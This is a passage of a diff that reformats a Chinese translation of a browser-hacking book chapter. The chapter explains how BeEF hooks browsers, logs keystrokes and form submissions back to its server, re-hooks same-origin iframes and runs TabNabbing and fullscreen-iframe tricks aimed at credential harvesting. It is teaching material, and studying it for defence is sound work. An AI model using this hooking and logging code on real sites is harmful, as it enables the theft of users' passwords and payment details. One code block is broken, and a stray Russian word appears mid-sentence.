    - **Level1 1.** `beef.net.send()` 方法将来自命令模块或其他 BeEF 库的任意数据放入一个 JavaScript 数组中。
+
    - **Level1 2.** BeEF 的轮询器执行 `beef.net.flush()` 方法，该方法：
+
      - 将数组对象转换为 JSON 表示。
+
      - 对 JSON 变量进行 Base64 编码。
+
      - 将 Base64 数据切分为固定长度的块。
+
      - 使用多个异步 GET 请求流式将块发送回 BeEF 服务器，每个块都带有相应的序列标识符。
 
-8.  **Level1 3.** BeEF 服务器收集所有响应，重新构建原始数据并重新组装块。
+8. **Level1 3.** BeEF 服务器收集所有响应，重新构建原始数据并重新组装块。
 
-9.  你可以在 [`browserhacker.com`](https://browserhacker.com) 或在维基网站 [www.wiley.com/go/browserhackershandbook](http://www.wiley.com/go/browserhackershandbook) 查看完整的 `beef.net.send` 代码。
+9. 你可以在 [`browserhacker.com`](https://browserhacker.com) 或在维基网站 [www.wiley.com/go/browserhackershandbook](http://www.wiley.com/go/browserhackershandbook) 查看完整的 `beef.net.send` 代码。
 
 * * *
 
@@ -4299,17 +4239,17 @@ beef.net.send("<%= @command_url %>", <%= @command_id %>,
 
 18. 除了这些篡改内容的方法，BeEF 还提供了许多其他模块，用于自动化 DOM 内容重写过程：
 
-*   **Replace HREFs** — 类似于 “Replace Component” 模块，该模块遍历锚元素并替换 `href` 属性。
-*   **Replace HREF (Click Events)** — 该模块与 “Replace HREFs” 类似，但只修改 `onclick` 事件处理程序，而不修改实际的 `href`。这类似于第三章中 “使用 Man-in-the-Browser 攻击” 章节讨论的 Man-in-the-Browser 技术。如果 `<a>` 元素已经包含 `onclick` 属性，此方法会简单地覆盖现有内容。根据需求，你可能需要修改默认行为以支持在单个 `onclick` 中堆叠多个动作。
+* **Replace HREFs** — 类似于 “Replace Component” 模块，该模块遍历锚元素并替换 `href` 属性。
+
+* **Replace HREF (Click Events)** — 该模块与 “Replace HREFs” 类似，但只修改 `onclick` 事件处理程序，而不修改实际的 `href`。这类似于第三章中 “使用 Man-in-the-Browser 攻击” 章节讨论的 Man-in-the-Browser 技术。如果 `<a>` 元素已经包含 `onclick` 属性，此方法会简单地覆盖现有内容。根据需求，你可能需要修改默认行为以支持在单个 `onclick` 中堆叠多个动作。
+
+- [替换 HTTPS 链接]—再次，此模块与“替换链接”模块相似，但它将所有 https:// 网站的链接修改为 http:// 等价链接。该模块与第 2 章“ARP 操作”部分中引入的 sslstrip 概念一起在线工作。
+
+- [替换 TEL 链接]—更新所有 tel:// 链接为您指定的新电话号码。这对于移动设备上的浏览器特别有用，因为您可能能够拦截敏感的电话通话。
+
+- [替换视频]—将所有 <embed> 元素替换为嵌入的 YouTube 视频。
 
 
-
-
--   [替换 HTTPS 链接]—再次，此模块与“替换链接”模块相似，但它将所有 https:// 网站的链接修改为 http:// 等价链接。该模块与第 2 章“ARP 操作”部分中引入的 sslstrip 概念一起在线工作。
-
--   [替换 TEL 链接]—更新所有 tel:// 链接为您指定的新电话号码。这对于移动设备上的浏览器特别有用，因为您可能能够拦截敏感的电话通话。
-
--   [替换视频]—将所有 <embed> 元素替换为嵌入的 YouTube 视频。
 
 技术讨论中提到的方法并不是内容被篡改的唯一途径。一旦您在被钩子网站的 JavaScript 上下文中拥有控制权，您就可以随心所欲地操作 DOM。
 
@@ -4321,21 +4261,17 @@ beef.net.send("<%= @command_url %>", <%= @command_id %>,
 
 在本节结束时，您将了解如何绑定自定义函数到许多浏览器例程。其中许多可以用于监控键盘输入、鼠标移动或窗口是否处于活动状态。
 
- start feature 
-
 * * *
 
-**Event Flow** W3C 定义了两种事件流：事件捕获和事件冒泡。无论哪种情况，所有事件都有指定的目标，目标事件应当保证执行。事件从文档根元素向下流经 DOM 一直到达目标。在目标元素与顶层元素之间的任何处理函数都可以在匹配事件类型（如 click 或 keypress）时捕获事件并执行其处理例程。目标的事件执行完毕后，事件处理例程会向上（或冒泡）沿同一 DOM 路径返回，同样执行处理例程。为何存在捕获和冒泡？最初，浏览器厂商实现了不同的方法；例如，Netscape 希望在事件下行时捕获事件，而 Microsoft 希望在事件上行时捕获事件。规范并未指定哪种方法，导致我们常常看到两种方法的混合。这体现了浏览器之间存在的奇怪但重要的差异。
+**Event Flow** W3C 定义了两种事件流：事件捕获和事件冒泡。无论哪种情况，所有事件都有指定的目标，目标事件应当保证执行。事件从文档根元素向下流经 DOM 一直到达目标。在目标元素与顶层元素之间的任何处理函数都可以在匹配事件类型（如 `click` 或 `keypress`）时捕获事件并执行其处理例程。目标的事件执行完毕后，事件处理例程会向上（或冒泡）沿同一 DOM 路径返回，同样执行处理例程。为何存在捕获和冒泡？最初，浏览器厂商实现了不同的方法；例如，Netscape 希望在事件下行时捕获事件，而 Microsoft 希望在事件上行时捕获事件。规范并未指定哪种方法，导致我们常常看到两种方法的混合。这体现了浏览器之间存在的奇怪但重要的差异。
 
 * * *
-
- end feature 
 
 ## 使用焦点事件
 
-每次用户访问网站时，浏览器都在与当前渲染页面的 DOM 交互。即使用户没有点击任何 HTML 元素或填写表单，浏览器仍可能将有价值信息提交给攻击者。例如，用户只需在页面上点击一次，然后离开，浏览器就会触发两个不同的事件：focus 事件和 blur 事件。
+每次用户访问网站时，浏览器都在与当前渲染页面的 DOM 交互。即使用户没有点击任何 HTML 元素或填写表单，浏览器仍可能将有价值信息提交给攻击者。例如，用户只需在页面上点击一次，然后离开，浏览器就会触发两个不同的事件：`focus` 事件和 `blur` 事件。
 
-在前面的示例基础上，您可以通过执行以下 JavaScript 来为 focus 事件绑定函数：
+在前面的示例基础上，您可以通过执行以下 JavaScript 来为 `focus` 事件绑定函数：
 
 ```
 window.addEventListener("focus", function(event) {
@@ -4343,7 +4279,7 @@ window.addEventListener("focus", function(event) {
 });
 ```
 
-Internet Explorer 6 到 8 不支持 addEventListener()，而是使用 attachEvent()。4 为了简化事件处理的管理，jQuery 将此功能封装到其友好的 on() 函数中。BeEF 实现的 jQuery 示例代码如下：
+Internet Explorer 6 到 8 不支持 `addEventListener()`，而是使用 `attachEvent()`。4 为了简化事件处理的管理，jQuery 将此功能封装到其友好的 `on()` 函数中。BeEF 实现的 jQuery 示例代码如下：
 
 ```
 $j(window).on("focus", function(event) {
@@ -4351,7 +4287,7 @@ $j(window).on("focus", function(event) {
 });
 ```
 
-为了进一步简化，jQuery 提供了另一个级别的简化——focus() 方法，使代码降至：
+为了进一步简化，jQuery 提供了另一个级别的简化——`focus()` 方法，使代码降至：
 
 ```
 $j(window).focus(function(event) {
@@ -4369,21 +4305,16 @@ $j(window).focus(function(event) {
 });
 ```
 
-得益于 jQuery 方法通常返回自身（jQuery 对象），您可以链式调用多个函数。上述命令在一次调用中同时为窗口对象的 focus 和 blur 事件绑定函数。该代码片段与 BeEF 初始化其日志功能非常相似，但 вместо调用 alert()，框架使用之前分析过的 beef.net.send() 函数将事件记录回 BeEF 服务器。
+得益于 jQuery 方法通常返回自身（jQuery 对象），您可以链式调用多个函数。上述命令在一次调用中同时为窗口对象的 `focus` 和 `blur` 事件绑定函数。该代码片段与 BeEF 初始化其日志功能非常相似，但 вместо调用 `alert()`，框架使用之前分析过的 `beef.net.send()` 函数将事件记录回 BeEF 服务器。
 
-focus 和 blur 事件属于焦点事件类型，如 W3C 的 DOM Level 3 Events 工作草案所述。5 每种焦点事件类型都可以绑定到 DOM 中的任意元素，但不能绑定到文档本身。除了 blur 和 focus，W3C 还定义了以下事件，它们按顺序发生：
+`focus` 和 `blur` 事件属于焦点事件类型，如 W3C 的 DOM Level 3 Events 工作草案所述。5 每种焦点事件类型都可以绑定到 DOM 中的任意元素，但不能绑定到文档本身。除了 `blur` 和 `focus`，W3C 还定义了以下事件，它们按顺序发生：
 
-*   focusin — 在目标实际获得焦点之前触发。
-
-*   focus — 在目标实际获得焦点时触发。
-
-*   DOMFocusIn — 已废弃的 DOM 事件，建议使用 focus 和 focusin 替代。
-
-*   focusout — 在焦点切换后，初始目标上触发。
-
-*   blur — 在焦点丢失后触发。
-
-*   DOMFocusOut — 已废弃的 DOM 事件，建议使用 blur 和 focusout 替代。
+*   `focusin` — 在目标实际获得焦点之前触发。
+*   `focus` — 在目标实际获得焦点时触发。
+*   `DOMFocusIn` — 已废弃的 DOM 事件，建议使用 `focus` 和 `focusin` 替代。
+*   `focusout` — 在焦点切换后，初始目标上触发。
+*   `blur` — 在焦点丢失后触发。
+*   `DOMFocusOut` — 已废弃的 DOM 事件，建议使用 `blur` 和 `focusout` 替代。
 
 总体而言，浏览器在元素获得焦点时会触发比失去焦点时更多的事件。大多数事件处理函数会传入一个事件对象，该对象包含关于被聚焦的元素以及事件流中上下元素的信息。
 
@@ -4395,22 +4326,19 @@ focus 和 blur 事件属于焦点事件类型，如 W3C 的 DOM Level 3 Events �
 
 与焦点和鼠标事件类似，键盘事件也遵循特定顺序：
 
-*   keydown — 按下一个键。
+*   `keydown` — 按下一个键。
+*   `keypress` — 按下一个键且该键具有字符值。例如，Shift 键不会产生 `keypress` 事件，但会产生 `keydown` 和 `keyup` 事件。
+*   `keyup` — 释放键。
 
-*   keypress — 按下一个键且该键具有字符值。例如，Shift 键不会产生 keypress 事件，但会产生 keydown 和 keyup 事件。
-
-*   keyup — 释放键。
-
-将自定义函数应用于这些事件，使攻击者能够监控各种任意输入，无论用户是否在填写表单。7 为了控制 BeEF 日志的冗长，设计决策是只记录鼠标点击事件和键盘按键事件。要捕获这些事件，BeEF 首先为事件绑定函数，如下所示。e 参数是事件对象，包含按键、位置、是否按下等信息：
+将自定义函数应用于这些事件，使攻击者能够监控各种任意输入，无论用户是否在填写表单。7 为了控制 BeEF 日志的冗长，设计决策是只记录鼠标点击事件和键盘按键事件。要捕获这些事件，BeEF 首先为事件绑定函数，如下所示。`e` 参数是事件对象，包含按键、位置、是否按下等信息：
 
 ```
 $j(document).keypress(
   function(e) { beef.logger.keypress(e); }
 );
+```
 
-
-
--   [beef.logger.keypress()函数](https://example.org)判断用户正在输入的元素是否已更改（例如，用户在特定字段中输入，然后切换到另一个字段）。当元素更改时，已输入的之前字符会被提交回 BeEF：
+*   [`beef.logger.keypress()`函数](https://example.org)判断用户正在输入的元素是否已更改（例如，用户在特定字段中输入，然后切换到另一个字段）。当元素更改时，已输入的之前字符会被提交回 BeEF：
 
 ```javascript
 keypress: function(e) {
@@ -4430,51 +4358,42 @@ keypress: function(e) {
 }
 ```
 
--   [beef.logger.push_stream()函数](https://example.org)汇总队列中的所有键盘输入，然后将它们提交回 BeEF 事件队列。在每次轮询请求时，队列中的数据会使用之前提到的 beef.net.send() 逻辑推送回 BeEF。
+*   [`beef.logger.push_stream()`函数](https://example.org)汇总队列中的所有键盘输入，然后将它们提交回 BeEF 事件队列。在每次轮询请求时，队列中的数据会使用之前提到的 `beef.net.send()` 逻辑推送回 BeEF。
 
--   为了应对各种键盘布局、格式、语言和其他国际化差异，DOM 通过事件数据属性 key 和 char 定义键盘值。这些属性基于 Unicode，从而支持国际化。char 值保存键的打印表示。如果按下的键没有打印表示，则包含空字符串。
+*   为了应对各种键盘布局、格式、语言和其他国际化差异，DOM 通过事件数据属性 `key` 和 `char` 定义键盘值。这些属性基于 Unicode，从而支持国际化。`char` 值保存键的打印表示。如果按下的键没有打印表示，则包含空字符串。
 
--   另一方面，key 值包含 — 你猜对了 — 键值。如果按下的键有非空的 char 值，则 key 和 char 会匹配。如果键没有打印表示（例如 Alt 键），则 key 值将从预定义的键值集合中确定。该集合由 W3C 在 [`www.w3.org/TR/DOM-Level-3-Events/#key-values-list`](http://www.w3.org/TR/DOM-Level-3-Events/#key-values-list) 文档化。
+*   另一方面，`key` 值包含 — 你猜对了 — 键值。如果按下的键有非空的 `char` 值，则 `key` 和 `char` 会匹配。如果键没有打印表示（例如 Alt 键），则 `key` 值将从预定义的键值集合中确定。该集合由 W3C 在 [`www.w3.org/TR/DOM-Level-3-Events/#key-values-list`](http://www.w3.org/TR/DOM-Level-3-Events/#key-values-list) 文档化。
 
--   同一 W3C 规范还定义了以下选择和定义 key 值的指南：
+*   同一 W3C 规范还定义了以下选择和定义 `key` 值的指南：
 
-*   如果按下的键的功能是生成可打印字符，且键值集合中存在有效字符，则：
+    *   如果按下的键的功能是生成可打印字符，且键值集合中存在有效字符，则：
+        *   `key` 属性必须是键值的字符串。
+        *   `char` 属性必须是字符的字符串。
+    *   如果键值集合中没有有效字符，则：
+        *   `key` 属性必须是字符的字符串。
+        *   `char` 属性必须是字符的字符串。
+    *   如果按下的键是功能键或修饰键，且键值集合中存在有效字符，则：
+        *   `key` 属性必须是键值的字符串。
+        *   `char` 属性必须是空字符串。
+    *   如果键值集合中没有有效字符，则必须创建键值。
 
-*   key 属性必须是键值的字符串。
+*   大部分规范集中在 `key` 和 `char` 值上。虽然许多实现仍依赖于较少文档化且现已废弃的 `keyCode` 和 `charCode` 属性。旧规范还包含了 `which` 属性，是一个实现特定的键盘按键代码标识，通常与 `keyCode` 相同。
 
-*   char 属性必须是字符的字符串。
+*   你可能注意到在前面的代码片段中，提交的字符属性使用了 `event.which` 变量。jQuery 会覆盖该属性，从而提供一个标准化的方法来收集按键的 Unicode 等效值。
 
-*   如果键值集合中没有有效字符，则：
+*   跨浏览器的键盘事件实现相当不一致。Jan Wolter 发表了题为 “JavaScript Madness: Keyboard Events.” 的研究。这些差异主要归因于浏览器之争。例如，`keyCode` 最初在 Internet Explorer 中可用，而 `which` 则在 Firefox 等其他浏览器中可用。
 
-*   key 属性必须是字符的字符串。
+*   无论浏览器内部如何处理这些事件，编写监控 keystrokes 的例程始终是有效的工具。使用 JavaScript 捕获这些事件并将其发送回你本人，很可能会揭示各种信息。如果在正确的时机捕获，甚至可能包括敏感信息，如用户密码或支付详情。
 
-*   char 属性必须是字符的字符串。
+### 使用鼠标和指针事件
 
-*   如果按下的键是功能键或修饰键，且键值集合中存在有效字符，则：
+另一个由 DOM 提供的事件类型是鼠标和指针事件。正如你所期待的，这些事件与 DOM 中的鼠标（或轨迹球）交互相关。指针事件本质上相同，但由没有鼠标的设备（如智能手机和平板）触发。类似于跟踪 DOM 中元素的焦点，捕获这些事件可以让攻击者有效监控 DOM 内的所有鼠标移动和点击，如果操作得当，甚至可以监控页面外的内容。
 
-*   key 属性必须是键值的字符串。
+在线键盘（虚拟键盘）是一种偶尔用于阻止键盘记录的技术，例如在在线银行门户输入密码时。通过为鼠标事件附加自定义逻辑，攻击者可能会跟踪鼠标游标的 x 和 y 坐标以及鼠标按钮的点击。这将可能允许重新创建密码，尽管从未触碰键盘。
 
-*   char 属性必须是空字符串。
+除了监控鼠标事件外，还公布了许多其他技术来绕过银行使用的虚拟键盘保护。其他技术包括截图和使用 Win32 API 访问包含虚拟键盘的 HTML 文档。
 
-*   如果键值集合中没有有效字符，则必须创建键值。
-
--   大部分规范集中在 key 和 char 值上。虽然许多实现仍依赖于较少文档化且现已废弃的 keyCode 和 charCode 属性。旧规范还包含了 which 属性，是一个实现特定的键盘按键代码标识，通常与 keyCode 相同。
-
--   你可能注意到在前面的代码片段中，提交的字符属性使用了 event.which 变量。jQuery 会覆盖该属性，从而提供一个标准化的方法来收集按键的 Unicode 等效值。
-
--   跨浏览器的键盘事件实现相当不一致。Jan Wolter 发表了题为 “JavaScript Madness: Keyboard Events.” 的研究。这些差异主要归因于浏览器之争。例如，keyCode 最初在 Internet Explorer 中可用，而 which 则在 Firefox 等其他浏览器中可用。
-
--   无论浏览器内部如何处理这些事件，编写监控 keystrokes 的例程始终是有效的工具。使用 JavaScript 捕获这些事件并将其发送回你本人，很可能会揭示各种信息。如果在正确的时机捕获，甚至可能包括敏感信息，如用户密码或支付详情。
-
--   **使用鼠标和指针事件**
-
--   另一个由 DOM 提供的事件类型是鼠标和指针事件。正如你所期待的，这些事件与 DOM 中的鼠标（或轨迹球）交互相关。指针事件本质上相同，但由没有鼠标的设备（如智能手机和平板）触发。类似于跟踪 DOM 中元素的焦点，捕获这些事件可以让攻击者有效监控 DOM 内的所有鼠标移动和点击，如果操作得当，甚至可以监控页面外的内容。
-
--   在线键盘（虚拟键盘）是一种偶尔用于阻止键盘记录的技术，例如在在线银行门户输入密码时。通过为鼠标事件附加自定义逻辑，攻击者可能会跟踪鼠标游标的 x 和 y 坐标以及鼠标按钮的点击。这将可能允许重新创建密码，尽管从未触碰键盘。
-
--   除了监控鼠标事件外，还公布了许多其他技术来绕过银行使用的虚拟键盘保护。其他技术包括截图和使用 Win32 API 访问包含虚拟键盘的 HTML 文档。
-
--   下面是一个示例，展示了每次用户在文档内点击时调用的事件处理函数：
+下面是一个示例，展示了每次用户在文档内点击时调用的事件处理函数：
 
 ```javascript
 document.addEventListener("click",function(event) {
@@ -4482,31 +4401,31 @@ document.addEventListener("click",function(event) {
 });
 ```
 
--   这段 JavaScript 为鼠标点击事件添加了一个函数，显示一个提示框，其中包含鼠标位置相对于显示文档的屏幕像素的 x 和 y 坐标。除了 screenX 和 screenY 变量外，事件还传递了 clientX 和 clientY 变量，这些变量提供了相对于可见视口的指针位置的 x 和 y 坐标。
+这段 JavaScript 为鼠标点击事件添加了一个函数，显示一个提示框，其中包含鼠标位置相对于显示文档的屏幕像素的 x 和 y 坐标。除了 `screenX` 和 `screenY` 变量外，事件还传递了 `clientX` 和 `clientY` 变量，这些变量提供了相对于可见视口的指针位置的 x 和 y 坐标。
 
--   视口与屏幕像素略有不同，因为视口的大小不会改变，始终代表浏览器中显示的可视窗口。Figure 5-1、Figure 5-2 和 Figure 5-3 分别展示了屏幕坐标、客户端坐标和页面坐标。
+视口与屏幕像素略有不同，因为视口的大小不会改变，始终代表浏览器中显示的可视窗口。Figure 5-1、Figure 5-2 和 Figure 5-3 分别展示了屏幕坐标、客户端坐标和页面坐标。
 
--   开始图 5-1
+开始图 5-1
 
 **Figure 5-1:** 屏幕坐标
 
 ![c05f001.eps](img/c05f001.png)
 
--   结束图 5-1 开始图 5-2
+结束图 5-1 开始图 5-2
 
 **Figure 5-2:** 客户端坐标
 
 ![c05f002.eps](img/c05f002.png)
 
--   结束图 5-2 开始图 5-3
+结束图 5-2 开始图 5-3
 
 **Figure 5-3:** 页面坐标
 
 ![c05f003.eps](img/c05f003.png)
 
--   结束图 5-3
+结束图 5-3
 
--   利用 jQuery（如下面的代码片段所示）也可以获得 pageX 和 pageY 变量，这些变量是相对于 <HTML> 标记开始处的相对坐标：
+利用 jQuery（如下面的代码片段所示）也可以获得 `pageX` 和 `pageY` 变量，这些变量是相对于 `<HTML>` 标记开始处的相对坐标：
 
 ```javascript
 $j(document).click(function(event) {
@@ -4514,23 +4433,15 @@ $j(document).click(function(event) {
 }
 ```
 
--   除了简单的点击事件外，鼠标事件类型还包括：
+除了简单的点击事件外，鼠标事件类型还包括：
 
-*   mousemove—鼠标移动到元素上。
-
-*   mouseover—鼠标移动到元素的边界。
-
-*   mouseenter—类似于 mouseover，但不冒泡到父元素。
-
-*   mouseout—鼠标离开元素的边界。
-
-*   mouseleave—类似于 mouseout，但不冒泡到父元素。
-
-*   mousedown—鼠标按钮在元素上按下。
-
-*   mouseup—鼠标按钮在元素上释放。
-
-
+*   `mousemove`—鼠标移动到元素上。
+*   `mouseover`—鼠标移动到元素的边界。
+*   `mouseenter`—类似于 `mouseover`，但不冒泡到父元素。
+*   `mouseout`—鼠标离开元素的边界。
+*   `mouseleave`—类似于 `mouseout`，但不冒泡到父元素。
+*   `mousedown`—鼠标按钮在元素上按下。
+*   `mouseup`—鼠标按钮在元素上释放。
 
 BeEF 的事件日志 默认情况下，BeEF 会自动记录本章中描述的所有事件类型。Figure 5-4 向您展示了多个键盘和鼠标事件的记录：开始图片  
 
@@ -4540,21 +4451,19 @@ BeEF 的事件日志 默认情况下，BeEF 会自动记录本章中描述的所
 
 * * *
 
-  end feature  
+如果您能够控制 DOM，那么没有任何阻碍可以捕获所有鼠标事件类型，从而可能让您查看并记录鼠标光标在网站上的移动路径。DOM 还暴露了滚轮事件类型，因此您可以跟踪用户使用滚轮向上和向下滚动页面的情况。将这些事件组合在一起，技术上完全可以重建并监控用户在挂钩页面内执行的每一个操作。
 
-如果您能够控制 DOM，那么没有任何阻碍可以捕获所有鼠标事件类型，从而可能让您查看并记录鼠标光标在网站上的移动路径。DOM 还暴露了滚轮事件类型，因此您可以跟踪用户使用滚轮向上和向下滚动页面的情况。将这些事件组合在一起，技术上完全可以重建并监控用户在挂钩页面内执行的每一个操作。  
+## 使用表单事件
 
-## 使用表单事件  
-
-除了为所有键盘事件附加处理函数外，BeEF 还为所有 `<form>` 元素附加自定义逻辑。利用 jQuery 的元素选择器，以下代码在当前 DOM 中为所有表单元素附加 `beef.logger.submit()` 函数：  
+除了为所有键盘事件附加处理函数外，BeEF 还为所有 `<form>` 元素附加自定义逻辑。利用 jQuery 的元素选择器，以下代码在当前 DOM 中为所有表单元素附加 `beef.logger.submit()` 函数：
 
 ```
 $j('form').submit(
   function(e) { beef.logger.submit(e); }
 );
-```  
+```
 
-`beef.logger.submit()` 函数会遍历正在提交的表单，捕获所有表单输入字段及其值（包括隐藏字段），并将这些值发送回 BeEF 服务器：  
+`beef.logger.submit()` 函数会遍历正在提交的表单，捕获所有表单输入字段及其值（包括隐藏字段），并将这些值发送回 BeEF 服务器：
 
 ```
 /**
@@ -4577,15 +4486,15 @@ submit: function(e) {
     this.events.push(f);
   } catch(e) {}
 }
-```  
+```
 
-`beef.logger.e` 类定义了一个简单的事件结构，使得由鼠标或键盘生成的不同类型事件能够以统一的方式提交回 BeEF 服务器。函数中间的 for 循环遍历表单的子元素。请注意，前面的代码并未考虑 disabled 属性在表单字段中的情况。  
+`beef.logger.e` 类定义了一个简单的事件结构，使得由鼠标或键盘生成的不同类型事件能够以统一的方式提交回 BeEF 服务器。函数中间的 `for` 循环遍历表单的子元素。请注意，前面的代码并未考虑 `disabled` 属性在表单字段中的情况。
 
-## 使用 Iframe 键盘记录  
+## 使用 Iframe 键盘记录
 
-将日志函数附加到当前 DOM 不仅局限于当前窗口。在同源策略（SOP）的约束下，JavaScript 可以将自身挂钩到其他 Iframe 里。DOM 通过其 `frames` 对象暴露当前文档中的所有帧。  
+将日志函数附加到当前 DOM 不仅局限于当前窗口。在同源策略（SOP）的约束下，JavaScript 可以将自身挂钩到其他 Iframe 里。DOM 通过其 `frames` 对象暴露当前文档中的所有帧。
 
-在 BeEF 实例化其 DOM 日志功能时，会遍历当前 DOM 中的帧，尝试在与当前挂钩来源同源的 Iframe 中重新挂钩每个子 Frame。随后，对任何已挂钩的子 Frame，这些 Frame 将包含 DOM 事件日志功能。执行此任务的函数是 `beef.browser.hookChildFrames()`，如下代码所示：  
+在 BeEF 实例化其 DOM 日志功能时，会遍历当前 DOM 中的帧，尝试在与当前挂钩来源同源的 Iframe 中重新挂钩每个子 Frame。随后，对任何已挂钩的子 Frame，这些 Frame 将包含 DOM 事件日志功能。执行此任务的函数是 `beef.browser.hookChildFrames()`，如下代码所示：
 
 ```
 /**
@@ -4593,112 +4502,158 @@ submit: function(e) {
  * Restricted by same-origin policy
  */
 hookChildFrames:function () {
-
   // create script object
   var script  = document.createElement('script');
-  script.type = 'text/javascript';
-  script.src  = '<%== @beef_proto %>://<%== @beef_host %>:
-    <%== @beef_port %><%== @hook_file %>';
 
-  // loop through child frames
-  for (var i=0;i<self.frames.length;i++) {
-    try {
-        // append hook script
-        self.frames[i].document.body.appendChild(script);
-    } catch (e) {
-    }
+
+
+`script.type = 'text/javascript';`
+
+`script.src  = '<%== @beef_proto %>://<%== @beef_host %>:` 
+
+`<%== @beef_port %><%== @hook_file %>';`
+
+// loop through child frames
+
+for (var i=0;i<self.frames.length;i++) {
+
+  try {
+
+      // append hook script
+
+      self.frames[i].document.body.appendChild(script);
+
+  } catch (e) {
+
   }
+
 }
-```  
 
-该函数的第一部分创建新的 BeEF 挂钩脚本元素，最后部分遍历所有帧并尝试将脚本追加到子 Frame 的 body 中。  
+该函数的第一部分创建新的 BeEF 挂钩脚本元素，最后部分遍历所有帧并尝试将脚本追加到子 Frame 的 body 中。
 
-除了自动挂钩所有子 Frame 外，BeEF 还提供一个独立的命令模块，实现类似功能。该模块名为“IFrame Event Logger”，适用于需要在当前窗口上方弹出一个覆盖 Iframe，并记录键盘输入但不一定需要完整 BeEF 挂钩的场景。  
+除了自动挂钩所有子 Frame 外，BeEF 还提供一个独立的命令模块，实现类似功能。该模块名为“IFrame Event Logger”，适用于需要在当前窗口上方弹出一个覆盖 Iframe，并记录键盘输入但不一定需要完整 BeEF 挂钩的场景。
 
-在这一节中，您已经探索了作为攻击者可以拦截的多种事件处理例程，以监控用户的行为。随着浏览器不断引入新特性，新的事件处理机制也会随之出现。例如，移动设备的普及促使 W3C 引入触摸事件。随着流行浏览器 DOM 的不断演进，监控和攻击面会随之扩大。  
+在这一节中，您已经探索了作为攻击者可以拦截的多种事件处理例程，以监控用户的行为。随着浏览器不断引入新特性，新的事件处理机制也会随之出现。例如，移动设备的普及促使 W3C 引入触摸事件。随着流行浏览器 DOM 的不断演进，监控和攻击面会随之扩大。
 
-# 社交工程  
+# 社交工程
 
-在第 2 章中，您已经体验了社交工程作为在目标浏览器中执行初始控制代码的有效方法。社交工程不必在此结束！您可以利用多种社交角度，进一步巩固对浏览器会话的控制。  
+在第 2 章中，您已经体验了社交工程作为在目标浏览器中执行初始控制代码的有效方法。社交工程不必在此结束！您可以利用多种社交角度，进一步巩固对浏览器会话的控制。
 
-有时最简单的方法就是直接提问。在合法浏览会话中，精心构造的社交工程诱饵对许多用户来说很难避免。这些诱饵形式多样，包括假软件更新、假登录提示，甚至恶意插件提示。  
+有时最简单的方法就是直接提问。在合法浏览会话中，精心构造的社交工程诱饵对许多用户来说很难避免。这些诱饵形式多样，包括假软件更新、假登录提示，甚至恶意插件提示。
 
-下面的章节讨论的技术大多超出浏览器范围，特别是那些诱使受害者运行可执行文件的技术。在系统可能已被补丁且安全的情况下，最简便的方法是利用用户的信任。  
+下面的章节讨论的技术大多超出浏览器范围，特别是那些诱使受害者运行可执行文件的技术。在系统可能已被补丁且安全的情况下，最简便的方法是利用用户的信任。
 
-## 使用 TabNabbing  
+## 使用 TabNabbing
 
-本章前面，您已经了解了通过 DOM 中的事件处理进行劫持的强大功能。一旦您理解用户如何与特定页面交互，就可以在用户不在当前窗口时进行操作。由于现今广泛使用的标签页，用户可能会在不同标签之间切换。一旦您捕获 blur 事件，就能轻松监测用户离开挂钩窗口的时间长度。下面的代码演示了此功能：  
+本章前面，您已经了解了通过 DOM 中的事件处理进行劫持的强大功能。一旦您理解用户如何与特定页面交互，就可以在用户不在当前窗口时进行操作。由于现今广泛使用的标签页，用户可能会在不同标签之间切换。一旦您捕获 blur 事件，就能轻松监测用户离开挂钩窗口的时间长度。下面的代码演示了此功能：
 
 ```
 var idle_timer;
+
 begin_countdown = function() {
+
   idle_timer = setTimeout(function() {
+
     performComplicatedBackgroundFunction();
+
   }, 60000);
+
 }
+
 $j(window).blur(function(e) {
+
   begin_countdown();
+
 }
+
 $j(window).focus = function() {
+
   clearTimeout(idle_timer);
+
 }
-```  
+```
 
-这段代码定义了 `idle_timer` 变量和 `begin_countdown` 函数。执行后，`idle_timer` 会设置一个定时器，使得 60 秒后 `performComplicatedBackgroundFunction()` 被触发。该函数在窗口的 blur 事件中被调用。为了在用户返回标签页时停止计时器，`focus` 事件也被修改为清除定时器。  
+这段代码定义了 `idle_timer` 变量和 `begin_countdown` 函数。执行后，`idle_timer` 会设置一个定时器，使得 60 秒后 `performComplicatedBackgroundFunction()` 被触发。该函数在窗口的 blur 事件中被调用。为了在用户返回标签页时停止计时器，`focus` 事件也被修改为清除定时器。
 
-TabNabbing 攻击的核心思想（最初由 Aza Raskin 提出）是改变您已控制的非活动标签的内容或位置。BeEF 的“TabNabbing”命令模块几乎包含完全相同的逻辑。默认情况下，该模块接受用户提供的两个参数：定时器等待时间以及重定向的 URL。此外，您还可以使用 `beef.browser.changeFavicon()` 函数更改网站的 favicon，以提升攻击效果。  
+TabNabbing 攻击的核心思想（最初由 Aza Raskin 提出）是改变您已控制的非活动标签的内容或位置。BeEF 的“TabNabbing”命令模块几乎包含完全相同的逻辑。默认情况下，该模块接受用户提供的两个参数：定时器等待时间以及重定向的 URL。此外，您还可以使用 `beef.browser.changeFavicon()` 函数更改网站的 favicon，以提升攻击效果。
 
-TabNabbing 攻击的一个典型用法是，将非活动标签的 URL 更改为 BeEF “Social Engineering”扩展（见第 2 章“使用社交工程攻击”部分）中克隆的网站 URL。这样，浏览器仍然保持对 BeEF 的挂钩，同时可以显示一个凭证采集页面。  
+TabNabbing 攻击的一个典型用法是，将非活动标签的 URL 更改为 BeEF “Social Engineering”扩展（见第 2 章“使用社交工程攻击”部分）中克隆的网站 URL。这样，浏览器仍然保持对 BeEF 的挂钩，同时可以显示一个凭证采集页面。
 
-## 使用全屏  
-
-
-
+## 使用全屏
 
 Full 屏幕攻击是一种很好的方法，用来让目标陷入一种安全感的假象。这些攻击最初在第三章的“全浏览器框架重叠”章节中介绍，但可以扩展，特别是在已经钩取的网页上下文中。
 
 一种细微的方法是欺骗当前被钩住的受害者，使其保持浏览器的钩住状态，方法是重写当前 DOM 中的所有链接，使其在全尺寸的 IFrames 中加载。下面的代码片段来自第三章，将被重新用于创建全屏 IFrames：
 
-``` 
+```
 createIframe: function(type, params, styles, onload) {
+
   var css = {};
+
   if (type == 'hidden') { 
+
     css = $j.extend(true, {
+
       'border':'none', 'width':'1px', 'height':'1px',
+
       'display':'none', 'visibility':'hidden'},
+
     styles);
+
   }
+
   if (type == 'fullscreen') { 
+
     css = $j.extend(true, {
+
       'border':'none', 'background-color':'white', 'width':'100%',
+
       'height':'100%',
+
       'position':'absolute', 'top':'0px', 'left':'0px'},
+
     styles); 
+
     $j('body').css({'padding':'0px', 'margin':'0px'});
+
   }
 
